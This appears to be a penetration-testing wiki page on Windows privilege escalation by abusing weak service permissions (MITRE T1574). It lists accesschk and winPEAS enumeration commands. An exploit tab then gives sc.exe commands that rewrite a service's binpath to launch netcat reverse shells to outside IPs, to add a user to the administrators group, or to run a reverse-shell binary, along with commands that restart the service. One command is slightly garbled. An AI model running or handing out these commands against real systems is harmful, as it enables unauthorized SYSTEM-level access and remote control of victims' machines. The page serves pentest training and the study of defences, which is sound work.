---
description: MITRE ATT&CK™  Hijack Execution Flow - Technique T1574
---

# Weak Service Permissions

## Theory

It is very often in Windows environments to discover services that run with SYSTEM privileges. If you have permissions over the service you can use it to escalate you privileges.

## Practice

If we have enough permissions over a service, we can edit the `binPath` parameters and replace it with our own binary or command.

{% tabs %}
{% tab title="Enum" %}
If you have `SERVICE_CHANGE_CONFIG` or `SERVICE_ALL_ACCESS` permissions, you can replace the binary.

We can use [AccessChk](https://learn.microsoft.com/fr-fr/sysinternals/downloads/accesschk) from sysinternals tools to enum permissions over services.

```powershell
#list all the services that a specific user can modify.
accesschk64.exe -uwcqv "pwned" * -accepteula
accesschk64.exe -uwcqv "Authenticated Users" * -accepteula
accesschk64.exe -uwcqv "BUILTIN\Users" * -accepteula
accesschk.exe -uwcqv %USERNAME% * -accepteula

#list permissions of evryone.
accesschk64.exe -uwcqv * -accepteula

#list permissions for "VulnSvc" service.
accesschk64.exe -uwcqv VulnSvc -accepteula
```

We also can use the `servicesinfo` module of winpeas

```powershell
winPEASx64.exe servicesinfo
```
{% endtab %}

{% tab title="Exploit" %}
We can edit the binpath parameter with following commands

```powershell
sc.exe config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc.exe config <Service_Name> binpath= "net localgroup administrators username /add"
sc.exe config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"s
sc.exe config <Service_Name> binpath= "C:\Documents and Settings\PEPE\reverseShell.exe"
```

And then, restart the service

```powershell
#Using wmic
wmic service <Service_Name> call stopservice
wmic service <Service_Name> call startservice

#Using net
net stop <Service_Name> && net start <Service_Name>

#Using sc.exe
sc.exe stop <Service_Name>
sc.exe start <Service_Name>
```
{% endtab %}
{% endtabs %}

## References

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---incorrect-permissions-in-services" %}
